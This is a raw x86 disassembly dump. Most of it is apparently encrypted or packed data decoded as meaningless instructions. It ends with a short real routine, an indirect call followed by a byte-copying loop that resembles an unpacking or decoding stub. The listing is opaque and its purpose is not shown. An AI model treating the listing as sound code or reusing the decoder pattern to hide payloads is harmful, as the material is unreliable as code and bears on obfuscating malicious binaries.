  41624d:	and    BYTE PTR [ebp+0x7f],ch
  416250:	cld    
  416251:	popa   
  416252:	cmp    esp,DWORD PTR [esi]
  416254:	arpl   WORD PTR [edx-0x74],dx
  416257:	jp     0x41620e
  416259:	jmp    0x4c9f:0xac12b37a
  416260:	test   al,0xf3
  416262:	pop    edx
  416263:	adc    eax,0x3cbcb89e
  416268:	icebp  
  416269:	cdq    
  41626a:	pop    ds
  41626b:	add    bl,BYTE PTR [eax]
  41626d:	jg     0x416282
  41626f:	inc    edi
  416270:	jle    0x41626e
  416272:	sar    DWORD PTR [edx],1
  416274:	gs or  al,0xae
  416277:	mov    esp,0x4574646f
  41627c:	les    esi,FWORD PTR [ecx+eiz*2-0x246a7ee8]
  416283:	push   ss
  416284:	fcom   QWORD PTR [eax]
  416286:	jb     0x4162b2
  416288:	shr    ebp,cl
  41628a:	call   0x2157fbf1
  41628f:	out    0x8,eax
  416291:	scas   eax,DWORD PTR es:[edi]
  416292:	sbb    eax,0x2f6d550d
  416297:	aas    
  416298:	stos   BYTE PTR es:[edi],al
  416299:	xor    eax,0x2425946b
  41629e:	mov    edi,DWORD PTR [ebx-0x1e]
  4162a1:	and    al,0xc1
  4162a3:	push   edi
  4162a4:	dec    eax
  4162a5:	jp     0x416258
  4162a7:	mov    ?,WORD PTR [ebp-0x3a39f3d4]
  4162ad:	pop    esi
  4162ae:	cmp    DWORD PTR [edi-0x50],ecx
  4162b1:	inc    ebx
  4162b2:	ja     0x416266
  4162b4:	push   cs
  4162b5:	sub    eax,0xf2f8d0b4
  4162ba:	rcr    BYTE PTR [ebp+0x4686782a],1
  4162c0:	push   cs
  4162c1:	jmp    0xf301460e
  4162c6:	(bad)  
  4162c7:	pushf  
  4162c8:	out    dx,al
  4162c9:	cdq    
  4162ca:	popf   
  4162cb:	loopne 0x416307
  4162cd:	lea    edx,[esi]
  4162cf:	leave  
  4162d0:	pop    ebx
  4162d1:	dec    edi
  4162d2:	test   BYTE PTR [ebx+0x57fd39cd],ah
  4162d8:	in     al,0xe5
  4162da:	fadd   QWORD PTR [ecx+0x46fb170e]
  4162e0:	xor    DWORD PTR [eax*1-0x18e9d99],esi
  4162e7:	or     BYTE PTR ds:0xa075cf55,0xa
  4162ee:	jmp    0x9c40:0xd9327415
  4162f5:	jne    0x4162da
  4162f7:	cli    
  4162f8:	aad    0x52
  4162fa:	xor    DWORD PTR [ecx],edx
  4162fc:	jle    0x41633f
  4162fe:	shl    edx,1
  416300:	int3   
  416301:	daa    
  416302:	xor    DWORD PTR [esi+eiz*8],edx
  416305:	es int 0x9c
  416308:	sar    BYTE PTR [edx+0x7d],1
  41630b:	test   al,0x1f
  41630d:	mov    WORD PTR [eax-0x75],es
  416310:	sub    BYTE PTR [ecx-0x27],al
  416313:	loope  0x4162e4
  416315:	fadd   st,st(6)
  416317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416318:	inc    eax
  416319:	mov    esi,0x705e729a
  41631e:	(bad)  [eax-0x58]
  416321:	push   es
  416322:	xor    al,0xc2
  416324:	fisubr WORD PTR [esi-0x1]
  416327:	scas   eax,DWORD PTR es:[edi]
  416328:	push   ds
  416329:	and    esi,eax
  41632b:	in     al,0x86
  41632d:	mov    bh,0x3a
  41632f:	ja     0x41637b
  416331:	adc    bl,bh
  416333:	popa   
  416334:	inc    ebp
  416335:	mov    dh,0xa
  416337:	jno    0x41637e
  416339:	add    esp,DWORD PTR [ecx-0xf]
  41633c:	jg     0x416330
  41633e:	ins    DWORD PTR es:[edi],dx
  41633f:	jecxz  0x41631e
  416341:	sti    
  416342:	and    edx,DWORD PTR [esi+edx*1+0x3c]
  416346:	aad    0x4a
  416348:	pop    ss
  416349:	jecxz  0x41631d
  41634b:	inc    esi
  41634c:	mov    al,0x80
  41634e:	mov    BYTE PTR [eax-0x23603952],ah
  416354:	fdivrp st(7),st
  416356:	(bad)  
  416357:	cdq    
  416358:	push   ds
  416359:	xchg   ebp,eax
  41635a:	and    eax,0x92dba57d
  41635f:	in     al,0x42
  416361:	aam    0x78
  416363:	mov    esi,0x84169207
  416368:	popf   
  416369:	push   ecx
  41636a:	inc    edi
  41636b:	pop    edi
  41636c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41636d:	and    BYTE PTR [edx+0x6b],0xf7
  416371:	and    eax,0x18439f00
  416376:	mov    al,0x8d
  416378:	test   eax,0x96b997e5
  41637d:	mov    WORD PTR [edx+0x219e4fb2],cs
  416383:	add    BYTE PTR [esi],ch
  416385:	mov    ecx,0xc335b127
  41638a:	rcr    BYTE PTR [edx-0x21],0xa6
  41638e:	add    esi,DWORD PTR [esi]
  416390:	pop    esi
  416391:	shr    dh,cl
  416393:	fild   WORD PTR [ecx+0x1c8557fa]
  416399:	mov    bl,0xe0
  41639b:	fbld   TBYTE PTR [eax-0x2b2b317d]
  4163a1:	jle    0x4163d9
  4163a3:	jmp    0x5f75:0xd44992c1
  4163aa:	(bad)  
  4163ab:	cmc    
  4163ac:	or     esp,0xffffff98
  4163af:	(bad)
  4163b3:	hlt    
  4163b4:	sbb    bh,BYTE PTR [edi+0x4b1d47df]
  4163ba:	xchg   ecx,eax
  4163bb:	pop    ds
  4163bc:	pop    ebx
  4163bd:	xor    cl,BYTE PTR [edi+eax*4+0x78]
  4163c1:	pop    ecx
  4163c2:	popf   
  4163c3:	loopne 0x416415
  4163c5:	enter  0x1c09,0xe0
  4163c9:	push   ds
  4163ca:	mov    eax,ds:0x5c361812
  4163cf:	jp     0x4163d1
  4163d1:	mov    DWORD PTR [ebx-0x2409f18d],edx
  4163d7:	inc    esp
  4163d8:	aam    0x8e
  4163da:	push   es
  4163db:	sub    ecx,ecx
  4163dd:	mov    dh,0xc8
  4163df:	or     cl,BYTE PTR [ecx]
  4163e1:	leave  
  4163e2:	(bad)  
  4163e3:	enter  0x1cdf,0xd4
  4163e7:	test   esi,0x9a8806ab
  4163ed:	and    eax,0xbeb2c830
  4163f2:	das    
  4163f3:	fadd   st(6),st
  4163f5:	retf   
  4163f6:	xchg   esi,eax
  4163f7:	push   edx
  4163f8:	call   0xc635:0x1813f32
  4163ff:	inc    edi
  416400:	push   esp
  416401:	ins    DWORD PTR es:[edi],dx
  416402:	add    al,al
  416404:	gs nop
  416406:	ins    BYTE PTR es:[edi],dx
  416407:	popa   
  416408:	out    0xf5,eax
  41640a:	je     0x41645b
  41640c:	push   ecx
  41640d:	inc    edx
  41640e:	mov    edx,0xbf9c00e3
  416413:	repnz aaa 
  416415:	add    ebp,DWORD PTR [esi-0x7d]
  416418:	outs   dx,DWORD PTR ds:[esi]
  416419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41641a:	jne    0x4163a9
  41641c:	xor    al,0x52
  41641e:	inc    esp
  41641f:	inc    eax
  416420:	xor    eax,esi
  416422:	or     BYTE PTR [edx+0x6b943d83],ah
  416428:	imul   ecx,DWORD PTR [edx+eax*2-0x31],0x65
  41642d:	scas   eax,DWORD PTR es:[edi]
  41642e:	or     eax,0x4df8593b
  416433:	daa    
  416434:	das    
  416435:	test   BYTE PTR ds:0x330b4d86,ah
  41643b:	dec    esp
  41643c:	stos   BYTE PTR es:[edi],al
  41643d:	and    BYTE PTR [ecx],al
  41643f:	lods   eax,DWORD PTR ds:[esi]
  416440:	cmp    eax,0xc1db577a
  416445:	enter  0x14e9,0x92
  416449:	mov    ecx,0xaeecb97c
  41644e:	call   0xf53d:0x53687b61
  416455:	lds    ebp,FWORD PTR [esi+0x61ee4953]
  41645b:	leave  
  41645c:	push   eax
  41645d:	dec    ebx
  41645e:	adc    al,0x4f
  416460:	sahf   
  416461:	sub    al,0x7
  416463:	cli    
  416464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416465:	inc    ebp
  416466:	in     al,0xb5
  416468:	push   0x39
  41646a:	fs xor al,0x38
  41646d:	mov    BYTE PTR [edx-0x29],ch
  416470:	fist   WORD PTR [edi-0x16]
  416473:	mov    ecx,0xb3f9b770
  416478:	xor    edi,DWORD PTR [eax]
  41647a:	fisubr WORD PTR ds:0x16b723c8
  416480:	mov    al,0xd9
  416482:	mov    ah,0x59
  416484:	leave  
  416485:	ror    DWORD PTR [edi],0x3d
  416488:	lods   al,BYTE PTR ds:[esi]
  416489:	or     eax,esi
  41648b:	xchg   edi,eax
  41648c:	out    0x2a,al
  41648e:	fstp   QWORD PTR [edx]
  416490:	lock es jmp 0x90d8d15c
  416497:	lods   eax,DWORD PTR ds:[esi]
  416498:	lods   al,BYTE PTR ds:[esi]
  416499:	mov    dl,0xe6
  41649b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41649c:	stos   DWORD PTR es:[edi],eax
  41649d:	mov    al,BYTE PTR [ecx-0x10cd2669]
  4164a3:	mov    esi,fs
  4164a5:	xchg   esp,eax
  4164a6:	push   esi
  4164a7:	add    ah,BYTE PTR [eax+0x8]
  4164aa:	sub    al,0x0
  4164ac:	dec    BYTE PTR [ecx]
  4164ae:	aad    0xb2
  4164b0:	data16 cld 
  4164b2:	add    cl,BYTE PTR [edx-0x721b8b59]
  4164b8:	icebp  
  4164b9:	in     eax,dx
  4164ba:	call   0x4687:0xaaf7fc64
  4164c1:	adc    ch,dh
  4164c3:	call   0x7e67:0xd6ccc4dd
  4164ca:	and    DWORD PTR [edi-0x5f],esi
  4164cd:	cli    
  4164ce:	xchg   edi,eax
  4164cf:	dec    ebp
  4164d0:	daa    
  4164d1:	jmp    0x41651a
  4164d3:	loope  0x416491
  4164d5:	sub    eax,0x29
  4164d8:	in     eax,0x2f
  4164da:	das    
  4164db:	in     eax,0x27
  4164dd:	mov    ah,al
  4164df:	pop    es
  4164e0:	cs cmp al,0xea
  4164e3:	xchg   esi,eax
  4164e4:	jbe    0x41646e
  4164e6:	xchg   ecx,eax
  4164e7:	in     al,dx
  4164e8:	loopne 0x41646f
  4164ea:	cli    
  4164eb:	xor    BYTE PTR [ebx],cl
  4164ed:	xchg   esi,eax
  4164ee:	sbb    ebx,DWORD PTR [eax]
  4164f0:	mov    edx,0x431a4228
  4164f5:	mov    edx,0xc9c3cba2
  4164fa:	nop
  4164fb:	sti    
  4164fc:	retf   0x9063
  4164ff:	inc    ecx
  416500:	add    DWORD PTR [ebx],0xd8690d1e
  416506:	repnz (bad) 
  416508:	mov    bl,bl
  41650a:	push   cs
  41650b:	mov    dh,0x42
  41650d:	fidivr DWORD PTR [edx-0x1d]
  416510:	aam    0x96
  416512:	mov    eax,esi
  416514:	mov    ecx,0xcf506e5f
  416519:	repnz in al,dx
  41651b:	xor    dh,BYTE PTR [edi+0x6f]
  41651e:	xor    esp,DWORD PTR [esi]
  416520:	push   ss
  416521:	dec    ecx
  416522:	jno    0x41658a
  416524:	sub    BYTE PTR [edx],al
  416526:	mov    ch,0xf6
  416528:	pop    es
  416529:	xor    ebp,ecx
  41652b:	inc    esp
  41652c:	pop    eax
  41652d:	inc    esi
  41652e:	pop    ebx
  41652f:	test   al,0x5b
  416531:	pop    esi
  416532:	scas   al,BYTE PTR es:[edi]
  416533:	pop    esp
  416534:	call   0xc626:0xf57b8c16
  41653b:	xchg   edi,eax
  41653c:	mov    eax,0x75ff568
  416541:	pop    ebx
  416542:	js     0x4165a8
  416544:	sub    eax,0x2c4bf6aa
  416549:	sub    DWORD PTR [eax],ebp
  41654b:	ror    BYTE PTR [eax-0x494da0c3],cl
  416551:	xchg   esp,eax
  416552:	push   edx
  416553:	leave  
  416554:	dec    ecx
  416555:	mov    ah,0xa5
  416557:	mov    edx,0xb1555bde
  41655c:	jl     0x416505
  41655e:	aad    0xef
  416560:	fcomp  st(3)
  416562:	mov    ah,0xac
  416564:	stc    
  416565:	mov    bh,0x7d
  416567:	hlt    
  416568:	inc    ecx
  416569:	ja     0x416592
  41656b:	int    0x52
  41656d:	or     DWORD PTR [ebp-0x40],edx
  416570:	rcr    BYTE PTR [eax],cl
  416572:	js     0x416594
  416574:	ret    0x6dec
  416577:	and    DWORD PTR [ebp+0x435ca1bf],0xedc40174
  416581:	out    0x13,eax
  416583:	jl     0x4165ef
  416585:	adc    cl,BYTE PTR [esi]
  416587:	fdiv   DWORD PTR [eax+eax*4]
  41658a:	fcmovu st,st(4)
  41658c:	cwde   
  41658d:	jp     0x4165a6
  41658f:	cmp    DWORD PTR [esi-0xdc2b88b],edi
  416595:	add    edx,DWORD PTR [ebx-0x5a]
  416598:	shl    BYTE PTR [edi-0x1765519b],0x96
  41659f:	xchg   edx,eax
  4165a0:	xchg   edi,eax
  4165a1:	mov    ds:0x7138bf2a,eax
  4165a6:	std    
  4165a7:	cmp    al,0x77
  4165a9:	fidiv  WORD PTR [eax-0x6c]
  4165ac:	out    0xc5,al
  4165ae:	fmul   DWORD PTR [edi+ebp*4]
  4165b1:	lods   eax,DWORD PTR ds:[esi]
  4165b2:	adc    al,0x87
  4165b4:	cli    
  4165b5:	cld    
  4165b6:	cmp    eax,0x3a15d0b7
  4165bb:	inc    ebx
  4165bc:	(bad)  
  4165bd:	cs aam 0x0
  4165c0:	cmp    eax,0x375c0d5b
  4165c5:	sub    eax,0x78a858c
  4165ca:	push   es
  4165cb:	pop    ds
  4165cc:	in     eax,0x33
  4165ce:	cmp    al,BYTE PTR [ebx+0x1e390f1a]
  4165d4:	sub    eax,0xa12c2a5c
  4165d9:	xor    DWORD PTR [edx-0x33],eax
  4165dc:	cli    
  4165dd:	aaa    
  4165de:	test   DWORD PTR [ebx],ecx
  4165e0:	lods   al,BYTE PTR ds:[esi]
  4165e1:	mov    edx,0x88733379
  4165e6:	jp     0x4165ff
  4165e8:	jne    0x416656
  4165ea:	jae    0x4165bd
  4165ec:	sbb    al,0xf2
  4165ee:	fwait
  4165ef:	sbb    al,BYTE PTR [edx+edx*4]
  4165f2:	mov    BYTE PTR [edx+esi*4+0x23],ch
  4165f6:	inc    esp
  4165f7:	dec    edi
  4165f8:	push   cs
  4165f9:	mov    ecx,0x89d9567d
  4165fe:	cwde   
  4165ff:	in     al,0xb4
  416601:	fstp   st(1)
  416603:	or     eax,0x378fc08c
  416608:	adc    al,0xf5
  41660a:	daa    
  41660b:	push   0x9c4f682f
  416610:	jle    0x41659d
  416612:	jb     0x41661b
  416614:	mov    WORD PTR [ebx-0x64cb593a],fs
  41661a:	jmp    0x4165e3
  41661c:	sbb    BYTE PTR [edi+0x10],dh
  41661f:	out    dx,al
  416620:	mov    DWORD PTR [esi-0x10],edx
  416623:	rcl    BYTE PTR [edi-0x63e1cd6f],0x4
  41662a:	mov    edi,0xdba213e3
  41662f:	int3   
  416630:	mov    ds:0xeb81bfbc,al
  416635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416636:	push   ebx
  416637:	mul    esi
  416639:	ja     0x41669d
  41663b:	jns    0x4165e6
  41663d:	int    0x8
  41663f:	and    edi,DWORD PTR [eax]
  416641:	mov    BYTE PTR es:[esi],bh
  416644:	shl    DWORD PTR [ebx+0x36549657],cl
  41664a:	test   BYTE PTR [eax],bl
  41664c:	das    
  41664d:	push   ebp
  41664e:	sub    al,0xdd
  416650:	jecxz  0x41668f
  416652:	pop    ebp
  416653:	shl    BYTE PTR [ecx],0x6e
  416656:	shr    DWORD PTR [ebp+0x3b],cl
  416659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41665b:	push   eax
  41665c:	outs   dx,BYTE PTR ds:[esi]
  41665d:	mov    edi,0xb77d25d4
  416662:	call   0x84b7e194
  416667:	and    DWORD PTR [ecx-0x7ed88f9c],edi
  41666d:	push   DWORD PTR [eax+edi*2-0x22]
  416671:	pop    ebp
  416672:	test   bh,bh
  416674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416675:	xor    esi,edx
  416677:	clc    
  416678:	fsubp  st(7),st
  41667a:	inc    ecx
  41667b:	mov    bl,0x76
  41667d:	inc    edx
  41667e:	fs and al,0x9c
  416681:	inc    esi
  416682:	mov    eax,0x4145919
  416687:	(bad)  
  416688:	dec    ebx
  416689:	imul   esi,ecx,0x6e
  41668c:	mov    cl,0x38
  41668e:	and    dl,0x45
  416691:	shl    DWORD PTR [edx-0x223a0f87],cl
  416697:	mov    ebx,0x7bab9786
  41669c:	jg     0x416708
  41669e:	call   0xe462fd4d
  4166a3:	push   ebp
  4166a4:	pop    es
  4166a5:	cs inc esi
  4166a7:	test   al,0x44
  4166a9:	and    al,dl
  4166ab:	leave  
  4166ac:	cmp    ch,BYTE PTR [esi+0x46a7561f]
  4166b2:	push   esi
  4166b3:	and    al,0xa7
  4166b5:	(bad)  
  4166b6:	fild   WORD PTR [esi+0xb]
  4166b9:	sbb    dl,BYTE PTR [edi+0x49fffc5b]
  4166bf:	les    esi,FWORD PTR [ecx+0x60]
  4166c2:	cdq    
  4166c3:	mov    cl,0xad
  4166c5:	xor    DWORD PTR [ecx],ebp
  4166c7:	mov    esi,0x50df27f2
  4166cc:	mov    dl,0xc2
  4166ce:	lods   eax,DWORD PTR ds:[esi]
  4166cf:	(bad)  
  4166d0:	dec    eax
  4166d1:	sub    eax,0xc25f64fa
  4166d6:	xor    al,ah
  4166d8:	mov    edi,0x127b6bef
  4166dd:	adc    dh,BYTE PTR [edi]
  4166df:	sub    eax,0xa36bf0d
  4166e4:	dec    ebp
  4166e5:	repnz ins DWORD PTR es:[edi],dx
  4166e7:	xchg   ebx,eax
  4166e8:	dec    ebx
  4166e9:	fsub   st,st(0)
  4166eb:	mov    ds:0x9443df39,eax
  4166f0:	xor    al,0xf1
  4166f2:	(bad)  
  4166f3:	push   es
  4166f4:	fldcw  WORD PTR [ecx]
  4166f6:	inc    ebp
  4166f7:	sub    DWORD PTR [edx],eax
  4166f9:	mov    ebp,DWORD PTR [edi]
  4166fb:	mov    cl,0xad
  4166fd:	leave  
  4166fe:	test   BYTE PTR [edx],ah
  416700:	mov    WORD PTR [edi+0x22],?
  416703:	or     eax,0x79700d1a
  416708:	cmp    esi,DWORD PTR [eax+eax*4]
  41670b:	adc    al,ch
  41670d:	test   DWORD PTR [eax+0x17],ebx
  416710:	xchg   edi,eax
  416711:	push   0xf22b273
  416716:	jo     0x416753
  416718:	sahf   
  416719:	js     0x416796
  41671b:	push   cs
  41671c:	mov    al,0xd3
  41671e:	cmc    
  41671f:	jg     0x4166f8
  416721:	in     al,dx
  416722:	lods   al,BYTE PTR ds:[esi]
  416723:	cmc    
  416724:	sub    ecx,0xffffffb9
  416727:	test   DWORD PTR [esi+0x4b],ebp
  41672a:	int    0xd2
  41672c:	lea    eax,[esi-0x3f356049]
  416732:	lds    esp,FWORD PTR ds:0xa55de3dd
  416738:	shl    DWORD PTR [edi],1
  41673a:	adc    dh,BYTE PTR [esi+0x19]
  41673d:	icebp  
  41673e:	jp     0x41677d
  416740:	int3   
  416741:	les    ecx,FWORD PTR [eax]
  416743:	int3   
  416744:	jp     0x4167b5
  416746:	adc    eax,0x82bd77b3
  41674b:	xor    eax,DWORD PTR [esi+edi*1]
  41674e:	inc    esp
  41674f:	div    ch
  416751:	fsubr  DWORD PTR [esi+0x8]
  416754:	mov    esi,0x8b9282e9
  416759:	xor    al,0x6a
  41675b:	test   ebp,esp
  41675d:	pop    edi
  41675e:	test   BYTE PTR [esi+0x3c754eac],ch
  416764:	inc    edi
  416765:	or     DWORD PTR [ebx+0xb],esi
  416768:	add    edi,DWORD PTR [edx+esi*1+0x7405853]
  41676f:	jl     0x4167b5
  416771:	or     eax,0xb2ae6f44
  416776:	fst    st(7)
  416778:	dec    edi
  416779:	idiv   BYTE PTR [edi]
  41677b:	mov    ecx,0xc4366b3c
  416780:	call   0x5697:0x3aa0dfbc
  416787:	in     eax,0x4
  416789:	(bad)  
  41678a:	jbe    0x416754
  41678c:	ins    BYTE PTR es:[edi],dx
  41678d:	jl     0x416719
  41678f:	inc    ecx
  416790:	mov    ds:0x7afbcb63,al
  416795:	in     eax,0xe9
  416797:	por    mm3,QWORD PTR [eax]
  41679a:	jmp    0x1eef:0x6b8b5a3d
  4167a1:	jb     0x416781
  4167a3:	into   
  4167a4:	mov    dl,0xe0
  4167a6:	adc    dl,BYTE PTR [eax]
  4167a8:	jg     0x41676b
  4167aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167ab:	lahf   
  4167ac:	push   0xecded4a4
  4167b1:	mov    ebx,0xd5d34c8
  4167b6:	imul   edx,DWORD PTR [eax+0x749ea260],0xffffffc2
  4167bd:	mov    edx,edx
  4167bf:	push   es
  4167c0:	stc    
  4167c1:	xchg   esi,eax
  4167c2:	push   esp
  4167c3:	and    DWORD PTR [edi+0x3126b787],esp
  4167c9:	pop    es
  4167ca:	cmp    dh,BYTE PTR [ebp+0x5d39699f]
  4167d0:	mov    esp,0x8c1675f8
  4167d5:	mov    al,ds:0xd27b89cd
  4167da:	xchg   esp,eax
  4167db:	aam    0x91
  4167dd:	cli    
  4167de:	and    al,0xe2
  4167e0:	adc    al,0xd4
  4167e2:	scas   al,BYTE PTR es:[edi]
  4167e3:	int3   
  4167e4:	(bad)
  4167e8:	sbb    edi,DWORD PTR [esi+0x428259a]
  4167ee:	(bad)  
  4167f0:	sub    eax,0x644f96fe
  4167f5:	sbb    esi,edi
  4167f7:	aaa    
  4167f8:	int3   
  4167f9:	aaa    
  4167fa:	nop
  4167fb:	dec    ebp
  4167fc:	jmp    0x7c0825d9
  416801:	ficomp WORD PTR [edi]
  416803:	test   eax,0xdb34e330
  416808:	adc    ecx,DWORD PTR [ebx+0x13f9e58e]
  41680e:	lods   al,BYTE PTR ds:[esi]
  41680f:	cli    
  416810:	or     dl,BYTE PTR [edi+0x2c]
  416813:	xchg   ebp,eax
  416814:	call   0xb0169914
  416819:	adc    BYTE PTR [ebx],dh
  41681b:	and    al,0xbc
  41681d:	sub    eax,0xd7288f8d
  416822:	jl     0x416892
  416824:	push   ecx
  416825:	out    dx,eax
  416826:	mov    ecx,DWORD PTR [ecx]
  416828:	pop    ds
  416829:	pop    si
  41682b:	ret    
  41682c:	xchg   edi,esi
  41682e:	(bad)  
  41682f:	in     eax,dx
  416830:	(bad)  
  416831:	int    0x53
  416833:	add    al,0x75
  416835:	nop    ebx
  416838:	lds    eax,FWORD PTR [ebx+0x33]
  41683b:	lahf   
  41683c:	je     0x416818
  41683e:	nop
  41683f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416840:	loopne 0x416891
  416842:	bound  edx,QWORD PTR [edx]
  416844:	aam    0x65
  416846:	and    DWORD PTR [edi+ebx*2],ebx
  416849:	adc    DWORD PTR [eax],ebx
  41684b:	sbb    al,ah
  41684d:	jb     0x4168b1
  41684f:	test   al,0xe1
  416851:	ja     0x416829
  416853:	fmul   st,st(2)
  416855:	inc    esp
  416856:	dec    ebp
  416857:	xor    BYTE PTR [edi],ch
  416859:	inc    ecx
  41685a:	imul   ebx,DWORD PTR [edx-0x1891e8fe],0xffffffcd
  416861:	and    BYTE PTR [edx+0x5cf9ce96],bl
  416867:	inc    ebp
  416868:	(bad)  
  416869:	nop
  41686a:	test   eax,0x3c792380
  41686f:	add    bl,BYTE PTR [eax-0x22]
  416872:	stos   BYTE PTR es:[edi],al
  416873:	pop    eax
  416874:	test   DWORD PTR [esi],0x618356d2
  41687a:	mov    eax,ds:0x67a1840f
  41687f:	jae    0x41685c
  416881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416882:	sbb    eax,0xf9dadef
  416887:	(bad)  
  416888:	cmc    
  416889:	pop    es
  41688a:	cmp    BYTE PTR [eax+0x5ffe3232],0x2
  416891:	adc    BYTE PTR [edi-0x48],0x3b
  416895:	cli    
  416896:	and    eax,0x177c6252
  41689b:	fisub  WORD PTR [ebx+0x30785cec]
  4168a1:	and    al,0x15
  4168a3:	mov    al,ds:0xe45b00c8
  4168a8:	in     eax,dx
  4168a9:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4168ab:	or     BYTE PTR [ecx+eiz*8],al
  4168ae:	pop    edx
  4168af:	pop    ebx
  4168b0:	xchg   ecx,eax
  4168b1:	leave  
  4168b2:	loop   0x4168f4
  4168b4:	pop    esp
  4168b5:	push   ss
  4168b6:	mov    ds:0x20a0be78,eax
  4168bb:	ins    DWORD PTR es:[edi],dx
  4168bc:	fstp   TBYTE PTR [eax-0x5f]
  4168bf:	lods   al,BYTE PTR ds:[esi]
  4168c0:	arpl   WORD PTR [ebp-0x61ef94bd],di
  4168c6:	std    
  4168c7:	inc    eax
  4168c8:	push   cs
  4168c9:	ficom  WORD PTR [edi-0x1f1a7101]
  4168cf:	(bad)  
  4168d0:	hlt    
  4168d1:	dec    edi
  4168d2:	cmp    edx,DWORD PTR [esi]
  4168d4:	xor    al,0x4a
  4168d6:	jno    0x416936
  4168d8:	je     0x4168fa
  4168da:	mov    BYTE PTR [ebx+0x76201095],ch
  4168e0:	ja     0x41693b
  4168e2:	xchg   ebx,eax
  4168e3:	jne    0x41691b
  4168e5:	push   0x1d
  4168e7:	int    0xd2
  4168e9:	add    eax,0x5b62abcb
  4168ee:	repz jmp FWORD PTR [ebx-0x78]
  4168f2:	xor    eax,0x24bfab6e
  4168f7:	lods   al,BYTE PTR ds:[esi]
  4168f8:	arpl   WORD PTR [eax],bp
  4168fa:	rcr    BYTE PTR [edi+0x4a],cl
  4168fd:	(bad)  
  4168fe:	push   ss
  4168ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416900:	test   eax,0xd211f884
  416905:	in     al,dx
  416906:	jo     0x4168b5
  416908:	std    
  416909:	inc    ebp
  41690a:	aaa    
  41690b:	les    ecx,FWORD PTR [edx+0x752c84da]
  416911:	frstor [esi+ecx*4-0x2180dbdd]
  416918:	cmc    
  416919:	xchg   esp,eax
  41691a:	fidiv  WORD PTR [edx+0x4b]
  41691d:	cld    
  41691e:	dec    ebp
  41691f:	sbb    BYTE PTR [edx-0x4c85ec84],bl
  416925:	jl     0x4168b4
  416927:	dec    eax
  416928:	and    BYTE PTR [ebx-0x76279f45],cl
  41692e:	add    eax,esi
  416930:	pop    es
  416931:	push   ebp
  416932:	jmp    0x55ebd0fc
  416937:	pop    esi
  416938:	xchg   ebx,edx
  41693a:	or     al,0x0
  41693c:	jecxz  0x41691a
  41693e:	mov    esi,DWORD PTR [ebp-0x4]
  416941:	call   esi
  416943:	mov    DWORD PTR [ebp-0x38],eax
  416946:	cmp    DWORD PTR [ebp-0x38],0x57
  41694a:	jne    0x416958
  41694c:	mov    edx,DWORD PTR [ebp-0x20]
  41694f:	push   edx
  416950:	call   0x401000
  416955:	add    esp,0x4
  416958:	xor    eax,eax
  41695a:	pop    esi
  41695b:	mov    esp,ebp
  41695d:	pop    ebp
  41695e:	ret    
  41695f:	push   ebp
  416960:	mov    ebp,esp
  416962:	sub    esp,0x124
  416968:	xor    eax,eax
  41696a:	mov    esp,ebp
  41696c:	pop    ebp
  41696d:	ret    
  41696e:	push   ebp
  41696f:	mov    ebp,esp
  416971:	sub    esp,0x2c
  416974:	push   ebx
  416975:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41697c:	mov    DWORD PTR [ebp-0xc],0x0
  416983:	mov    DWORD PTR [ebp-0x20],0x1
  41698a:	mov    DWORD PTR [ebp-0x10],0x0
  416991:	mov    eax,DWORD PTR [ebp+0xc]
  416994:	mov    DWORD PTR [ebp-0x1c],eax
  416997:	mov    DWORD PTR [ebp-0x18],0x0
  41699e:	mov    DWORD PTR [ebp-0x8],0x0
  4169a5:	mov    DWORD PTR [ebp-0x24],0x0
  4169ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4169af:	sub    ecx,0x1
  4169b2:	mov    DWORD PTR [ebp-0x4],ecx
  4169b5:	mov    edx,DWORD PTR [ebp+0x8]
  4169b8:	mov    DWORD PTR [ebp-0x10],edx
  4169bb:	mov    DWORD PTR [ebp-0x28],0x1
  4169c2:	mov    eax,DWORD PTR [ebp-0x4]
  4169c5:	add    eax,0x2
  4169c8:	mov    DWORD PTR [ebp-0x4],eax
  4169cb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4169ce:	add    ecx,DWORD PTR [ebp-0x4]
  4169d1:	mov    dl,BYTE PTR [ecx+0x1]
  4169d4:	mov    BYTE PTR [ebp-0x11],dl
  4169d7:	mov    eax,DWORD PTR [ebp-0x4]
  4169da:	add    eax,0x1
  4169dd:	mov    DWORD PTR [ebp-0x4],eax
  4169e0:	mov    cl,BYTE PTR [ebp-0x11]
  4169e3:	mov    BYTE PTR [ebp-0x29],cl
  4169e6:	push   edx
  4169e7:	pop    ebx
  4169e8:	mov    ecx,ebx
  4169ea:	mov    edx,DWORD PTR [ebp-0x10]
  4169ed:	add    edx,DWORD PTR [ebp-0x4]
  4169f0:	mov    al,BYTE PTR [ebp-0x29]
  4169f3:	mov    BYTE PTR [edx],al
  4169f5:	mov    ebx,esi
  4169f7:	mov    ecx,DWORD PTR [ebp+0x14]
  4169fa:	add    ecx,DWORD PTR [ebp-0x8]
  4169fd:	movzx  edx,BYTE PTR [ecx]
  416a00:	mov    DWORD PTR [ebp-0xc],edx
  416a03:	mov    eax,DWORD PTR [ebp-0x8]
  416a06:	mov    ecx,DWORD PTR [ebp-0x28]
  416a09:	add    eax,ecx
  416a0b:	mov    DWORD PTR [ebp-0x8],eax
  416a0e:	mov    eax,DWORD PTR [ebp-0x8]
  416a11:	shr    eax,0x3
  416a14:	mov    ecx,0x1
  416a19:	sub    ecx,eax
  416a1b:	mov    DWORD PTR [ebp-0x20],ecx
  416a1e:	shr    eax,cl
  416a20:	mov    edx,DWORD PTR [ebp-0x8]
  416a23:	imul   edx,DWORD PTR [ebp-0x20]
  416a27:	mov    DWORD PTR [ebp-0x8],edx
  416a2a:	shl    ebx,0x3
